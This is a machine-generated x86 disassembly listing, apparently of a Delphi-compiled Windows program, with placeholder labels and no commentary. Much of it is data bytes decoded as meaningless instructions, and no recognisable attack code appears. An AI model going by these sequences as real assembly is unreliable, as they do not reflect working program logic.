lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4503f0
mov eax [ ebp - 0x8 ]
pop edx
call sub_407bf4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450548
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f80
retn
sub_450550
adc al [ eax ]
add [ eax ] al
mov al 0x3c
inc esi
add [ edi + edi ] dl
inc esi
add [ esp + edi + 0x3ed40046 ] ch
inc esi
add [ eax - 0x73ffb9c4 ] ch
inc esi
add [ esp + edi + 0x3ebc0046 ] ah
inc esi
add [ eax + 0x7800463c ] ah
inc ecx
inc esi
add [ esp + edi + 0x3ec40046 ] bl
inc esi
add [ eax + 0x2000463c ] bl
inc eax
inc esi
add [ esp + edi + 0x3f9c0046 ] dl
inc esi
add [ eax + 0x463c ] dl
inc edx
inc esi
add [ esp + edi + 0x41fc0046 ] cl
inc esi
add [ eax + 0x5800463c ] cl
aas
inc esi
add [ esp + edi + 0x41b80046 ] al
inc esi
add [ eax - 0x7fffb9c4 ] al
inc ecx
inc esi
add [ esp + edi + 0x46 ] bh
add [ eax + 0x42 ] cl
inc esi
add [ eax + 0x3c ] bh
inc esi
add [ edx + eax * 2 ] bl
inc esi
add [ esp + edi + 0x46 ] dh
add [ eax + 0x3f ] ch
inc esi
add [ eax + 0x3c ] dh
inc esi
add [ eax + 0x3f ] bh
inc esi
add [ esp + edi + 0x46 ] ch
add [ eax + 0x5500463f ] dh
mov ebp esp
xor eax eax
push ebp
push sub_450648
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45064f
retn
mov eax [ rw-data ]
call sub_403224
mov eax [ rw-data ]
call sub_403224
mov eax [ rw-data ]
call sub_403224
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_4049d8
mov eax rw-data
call sub_403f5c
sub_450654
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_450550
call sub_403d08
mov eax [ r-xdata ]
call sub_413154
mov eax [ r-xdata ]
call sub_4131f4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4131a0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4131a0
mov eax [ r-xdata ]
call sub_413098
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422130
mov [ rw-data ] eax
sub_4508a3
clc
xor [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
add [ eax ] al
[ 0x1ff0000 ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
call esp
xor al [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
sbb [ ebx ] dh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
popad
outsb
add [ gs : bx + si ] dl
outsd
insb
outsd
jb r-xdata
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
add [ edi + edi * 8 + 0x43 ] al
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ esi + esi ] ah
inc ebp
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al dl
or [ ebp ] eax
or [ edi + 0x73 ] dh
inc ebp
add [ eax ] cl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
add eax 0x676e6152
add [ gs : eax ] dl
adc [ eax ] al
or al 0x0
add bh bh
adc [ edx ] dh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
add [ 0xffffffffecb03c01 ] edx
inc eax
inc esp
add [ eax - 0x4bffbbff ] dh
xor eax 0x205c0044
inc esp
add [ ebx + 0x44 ] cl
add al dl
inc ebp
add [ eax - 0x4bffbac7 ] al
cmp eax [ ebp ]
push es
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
add ah ah
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
inc esp
add [ edi + esi * 8 ] cl
inc ebx
add [ esi + edi - 0x235fffbf ] bh
inc ebx
add [ eax + esi * 4 - 0x1c3fffbd ] bl
inc ebx
dec esi
outsd
jb r-xdata
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
push [ eax ]
xor eax [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
add [ eax ] al
je r-xdata
pushfd
mov al 0x43
add al al
jecxz r-xdata
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
[ eax ]
xor eax [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
jmp [ eax + 0x33 ]
inc ebx
add [ eax ] ch
mov ebx 0xbaa00043
inc ebx
add [ ebp + edi * 4 - 0x439fffbd ] dh
inc ebx
add al ah
std
inc ebx
add [ eax ] ah
fild [ ebx ]
add [ edx ] ah
inc esp
add [ edx + 0x1db80044 ] bh
inc esp
add [ eax - 0x23ffbbde ] ah
cmp al 0x45
add [ eax + 0x6c004536 ] dh
clc
inc ebx
add [ eax + 0x36 ] ah
inc ebp
add [ ebp + esi * 8 + 0x43 ] dl
add [ eax + 0x36 ] dh
inc ebp
add [ ecx + edi * 8 ] al
inc ebx
add [ eax ] cl
stc
inc ebx
add al al
test [ ebx ] sub_43f768
loopne r-xdata
inc ebx
add [ ecx + edi * 4 - 0x502bffbd ] bl
add [ ecx + edi * 4 - 0x6487ffbd ] dh
inc ecx
add [ eax - 0x68 ] ah
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax - 0x53ffbe65 ] al
xor eax 0x29f80045
inc esp
add [ edi + ebp ] dl
inc esp
add [ eax + 0x2e ] ah
inc esp
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esp + 0x44 ] dh
add [ esp + 0x21ac0044 ] dl
inc esp
add [ eax - 0x52 ] bl
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add [ eax - 0x22 ] dh
inc ebx
add [ esi + ebx * 8 - 0x4663ffbd ] bl
inc ebx
add ah dl
scasd [ edi ]
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
xor [ ebx ] 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add ah dl
or [ ebp ] eax
add ecx [ esp + edx * 2 ]
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
shl [ edx + ecx + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
or eax [ ebp ]
pop esi
or eax [ ebp ]
sbb al 0x2
add [ eax ] al
xor al 0x7e
inc ebx
add [ eax - 0x65 ] ah
inc ecx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
sub_451040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
add [ esi ] cl
adc eax [ ebp ]
clc
add al [ eax ]
add [ eax ] bl
or al [ ebp ]
pushad
fwait
inc ecx
add [ eax + 0x3f ] ch
inc ebp
add [ ecx + eax * 2 ] bl
inc ebp
add [ eax + 0x34 ] ch
inc eax
add [ eax - 0x43ffba9b ] cl
xor [ eax ] eax
fdiv [ ecx ]
inc eax
add [ ecx + eax * 2 + 0x2ee40045 ] al
inc esp
add ah dh
inc esi
inc ebp
add [ esi + edi + 0x43440041 ] bh
inc ebp
add [ eax - 0x73ffbabd ] al
inc esp
inc ebp
add [ ecx + edi * 4 - 0x6487ffbd ] dh
inc ecx
add [ ecx * 2 - 0x67a7ffbb ] al
inc ecx
add [ eax + ecx * 4 + 0x3ddc0045 ] ah
inc ebp
add al bh
sub [ eax + eax + 0x14 ] eax
das
inc esp
add [ eax + 0x2e ] ah
inc esp
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esp + 0x44 ] dh
add ah ah
dec ecx
inc ebp
add [ ecx - 0x51a7ffbc ] ch
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add al bl
dec edx
inc ebp
add [ esi + ebx * 8 - 0x4663ffbd ] bl
inc ebx
add ah dl
scasd [ edi ]
inc ebx
add [ eax ] ch
mov ebx 0x4ccc0043
inc ebp
add [ eax + 0x6000454b ] bl
mov esp 0x4d440043
inc ebp
add [ eax ] ah
fild [ ebx ]
add [ edx ] ah
inc esp
add [ edx + 0x1db80044 ] bh
inc esp
add [ eax - 0x23ffbbde ] ah
cmp al 0x45
add al ch
push ebx
inc ebp
add [ eax + edi * 8 + 0x43 ] ch
add [ eax + 0x640c0045 ] ch
inc ebp
add al cl
bound eax [ ebp ]
add al 0xf9
inc ebx
add [ eax ] cl
stc
inc ebx
add [ ebp + 0x45 ] al
add [ eax - 0x9 ] ch
inc ebx
add al ah
and eax [ eax + eax + 0x38 ]
insb
inc ebp
add [ ebp + esi + 0x205c0044 ] dh
inc esp
add [ ecx + eax * 4 + 0x45 ] cl
add al dl
inc ebp
add [ eax + 0x2c004539 ] al
jb r-xdata
inc ebp
add [ eax ] ah
adc eax [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sahf
adc [ ebp ] eax
push cs
lldt [ eax + eax ]
daa
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add [ eax + 0x42 ] ch
inc ebp
add ah ah
inc edx
inc ebp
add [ eax * 4 + 0x3fa00045 ] ch
inc ebp
add [ eax ] dh
add [ ebp ] 0x10
inc ebp
add ah ah
add [ ebp ] sub_454cc8
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax ] al
or [ eax * 2 + 0x25000 ] 0x0
mov ah 0xc
inc ebp
add [ edx + eax ] ah
add [ 0x14000f00 ] bh
add [ edi ] ah
sub_451344
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ eax * 2 ] ss
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7ffbaec ] al
add al [ eax ]
add [ eax + edx ] bh
inc ebp
add [ eax - 0x65 ] ah
inc ecx
add [ eax + 0x3f ] ch
inc ebp
add [ ecx + eax * 2 ] bl
inc ebp
add [ eax + 0x34 ] ch
inc eax
add [ eax - 0x43ffba9b ] cl
xor [ eax ] eax
fdiv [ ecx ]
inc eax
add [ ecx + eax * 2 + 0x2ee40045 ] al
inc esp
add ah dh
inc esi
inc ebp
add [ esi + edi + 0x43440041 ] bh
inc ebp
add [ eax - 0x73ffbabd ] al
inc esp
inc ebp
add [ ecx + edi * 4 - 0x6487ffbd ] dh
inc ecx
add [ ecx * 2 - 0x67a7ffbb ] al
inc ecx
add [ eax + ecx * 4 + 0x3ddc0045 ] ah
inc ebp
add al bh
sub [ eax + eax + 0x14 ] eax
das
inc esp
add [ eax + 0x2e ] ah
inc esp
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esp + 0x44 ] dh
add ah ah
dec ecx
inc ebp
add [ ecx - 0x51a7ffbc ] ch
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add al bl
dec edx
inc ebp
add [ esi + ebx * 8 - 0x4663ffbd ] bl
inc ebx
add ah dl
scasd [ edi ]
inc ebx
add [ eax ] ch
mov ebx 0x4ccc0043
inc ebp
add [ eax + 0x6000454b ] bl
mov esp 0x4d440043
inc ebp
add [ eax ] ah
fild [ ebx ]
add [ edx ] ah
inc esp
add [ edx + 0x1db80044 ] bh
inc esp
add [ eax - 0x23ffbbde ] ah
cmp al 0x45
add al ch
push ebx
inc ebp
add [ eax + edi * 8 + 0x43 ] ch
add [ eax + 0x640c0045 ] ch
inc ebp
add al cl
bound eax [ ebp ]
add al 0xf9
inc ebx
add [ eax ] cl
stc
inc ebx
add [ ebp + 0x45 ] al
add [ eax - 0x9 ] ch
inc ebx
add al ah
and eax [ eax + eax + 0x38 ]
insb
inc ebp
add [ ebp + esi + 0x205c0044 ] dh
inc esp
add [ ecx + eax * 4 + 0x45 ] cl
add al dl
inc ebp
add [ eax + 0x2c004539 ] al
jb r-xdata
add [ eax + 0x24 ] dh
inc ecx
add [ eax + eax ] bh
add dh bh
inc eax
scasd [ edi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000d ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
call 0x2045584c
add al [ eax ]
add [ eax + 0x42 ] ch
inc ebp
add ah ah
inc edx
inc ebp
add [ eax * 4 + 0x3fa00045 ] ch
inc ebp
add [ eax ] dh
add [ ebp ] 0x10
inc ebp
add ah ah
add [ ebp ] sub_454cc8
add eax 0x726f4654
insd
mov eax eax
mov [ eax * 2 + 0x54050700 ] ss
inc esi
outsd
jb r-xdata
add [ eax ] al
mov [ ebx ] ss
inc ebp
add [ ebx + edx ] bl
inc ebp
add [ esi ] bl
add eax 0x6d726f46
jae r-xdata
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
popad
inc edx
insb
outsb
push esp
adc [ eax ] al
loope r-xdata
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
inc [ eax ]
mov al [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsd
outsb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
adc al 0x8a
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x0
add [ eax ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
add bh bh
add [ esi ] dl
add [ ebx ] cl
inc edx
outsd
jb r-xdata
or eax [ ebp ]
sub [ edx ] eax
add bh bh
mov al [ 0x6c004555 ]
pop eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
outsd
push 0x6100436e
add [ eax ] al
jmp [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
popad
jo r-xdata
jb r-xdata
add [ eax ] al
sbb [ edx ] 0x0
or al 0x43
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
ror [ ebx + 0x45 ] 0x0
sbb [ ecx + 0x45 ] cl
insb
loopne r-xdata
call 0x3d4416f6
mov al [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add al dl
mov ch 0x43
add al al
dec ebx
imul ebp [ edi + 0x6e ] r-xdata
adc al 0xb6
inc ebx
jb r-xdata
jae r-xdata
arpl [ edi + 0x6e ] bp
popad
outsb
jae r-xdata
cmp al 0xaa
inc ecx
add [ eax ] dh
add bh bh
insb
mov ebp 0xbd880043
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
add al dh
dec ebx
inc ebp
add [ eax ] bl
dec ecx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
inc ebx
add [ ecx + eax ] ch
add [ eax ] al
popad
jb r-xdata
inc ebp
add [ eax ] bl
dec ecx
inc ebp
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
int3
push ebp
jae r-xdata
popad
jb r-xdata
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax + 0x1 ] al
or al 0x25
inc esp
add [ eax ] dh
and eax 0x44
outsb
je r-xdata
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ eax ] al
add [ eax ] al
push cs
inc ebp
add [ ecx ] dh
add al [ eax ]
push [ ecx ]
add al [ eax ]
[ eax + ebx * 2 + 0x45 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x60ff0001 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
les ebp [ gs : ebp + 0x43 ]
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
test al 0xf
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
add [ eax ] al
stosb [ edi ]
inc ecx
add ah ch
add al [ eax ]
[ eax ]
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
add eax [ eax ]
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0xcff0001 ] ah
and eax 0x25300044
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
adc [ edi + 0x43 ] ch
add [ eax + eax ] dh
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
fadd [ ebx ]
add [ eax ] al
add [ eax + 0x1 ] al
add [ es : edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x40109474
add [ edx + eax ] bh
add bh bh
cmp al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
outsb
je r-xdata
insd
inc ebx
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
outsd
outsb
dec ecx
imul ebp [ ebp - 0x18 ] 0x8004507
add al [ eax ]
[ eax + 0x38 ]
cmp al 0x10
outsd
outsb
je r-xdata
inc eax
add [ ecx ] bl
add bh bh
clc
mov esp 0x10043
add [ eax ] al
add [ eax ] al
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
scasb [ edi ]
inc ecx
add [ eax ] ch
add bh bh
sar [ ebx + eax * 2 + 0x43bcd000 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
add al 0x46
outsd
outsb
je r-xdata
push 0xc0ff0000
mov esp 0xbcd00043
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040028 ] al
or al 0x45
add [ edi ] ch
add al [ eax ]
[ eax + ebx * 2 + 0x586c0045 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ esi + 0x6f ] eax
jb r-xdata
insb
inc edx
popad
jb r-xdata
push ebx
je r-xdata
sub al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
[ eax + ebx * 2 + 0x45 ]
mov dh 0x41
add [ eax + 0x2 ] al
add bh bh
pushad
pop eax
inc ebp
add [ eax + ebx * 2 + 0x45 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002b ] al
inc eax
add [ eax + eax ] cl
[ ebx + esi * 4 + 0x49280043 ]
insb
cmp al 0x10
sub_4514ce
in al dx
inc ebp
add [ eax + ebx * 2 + 0x45 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410d000e ] al
arpl [ ecx + ebp * 2 + 0x76 ] si
inc ebx
outsd
outsb
je r-xdata
outsb
inc ebx
add [ ecx ] ah
add bh bh
and [ edi - 0x5043ffbd ] ch
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
insb
inc eax
inc ebx
add [ ebx ] bl
add bh bh
loopne r-xdata
je r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
[ eax + edi ]
add [ eax + eax ] bh
add dh bh
inc eax
scasd [ edi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000d ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
call 0x2045584c
add al [ eax ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
inc [ eax ]
mov al [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
jo r-xdata
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
inc ebp
add [ eax + ebx * 2 + 0x45 ] ch
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
push ss
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
popad
inc edx
insb
outsb
push esp
adc [ eax ] al
loope r-xdata
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
popad
jo r-xdata
jb r-xdata
outsd
outsb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
adc al 0x8a
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x0
add [ eax ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
add bh bh
popad
outsb
jae r-xdata
cmp al 0xaa
inc ecx
add [ eax ] dh
add bh bh
insb
mov ebp 0xbd880043
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
inc ebp
add [ eax ] bl
dec ecx
inc ebp
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
int3
call 0x3d4416f6
mov al [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
imul ebp [ edi + 0x6e ] r-xdata
adc al 0xb6
inc ebx
jae r-xdata
arpl [ edi + 0x6e ] bp
add [ ebx ] cl
inc edx
outsd
jb r-xdata
add [ esi ] dl
or eax [ ebp ]
sub [ edx ] eax
add bh bh
mov al [ 0x6c004555 ]
pop eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
outsd
push 0x6100436e
add [ eax ] al
jmp [ eax ]
push ebp
jae r-xdata
popad
jb r-xdata
adc [ eax ] al
add [ eax ] al
popad
jb r-xdata
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add al dl
mov ch 0x43
add al al
dec ebx
add [ eax ] al
sbb [ edx ] 0x0
or al 0x43
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
ror [ ebx + 0x45 ] 0x0
sbb [ ecx + 0x45 ] cl
insb
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
add [ eax + 0x1 ] al
or al 0x25
inc esp
add [ eax ] dh
and eax 0x44
outsb
je r-xdata
add al dh
dec ebx
inc ebp
add [ eax ] bl
dec ecx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
inc ebx
add [ ecx + eax ] ch
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ eax ] al
add [ eax ] al
push cs
inc ebp
add [ ecx ] dh
add al [ eax ]
push [ ecx ]
add al [ eax ]
[ eax + ebx * 2 + 0x45 ]
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x60ff0001 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
les ebp [ gs : ebp + 0x43 ]
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
test al 0xf
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
add [ eax ] al
stosb [ edi ]
inc ecx
add ah ch
add al [ eax ]
[ eax ]
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
adc [ edi + 0x43 ] ch
add [ eax + eax ] dh
add eax [ eax ]
add [ eax ] al
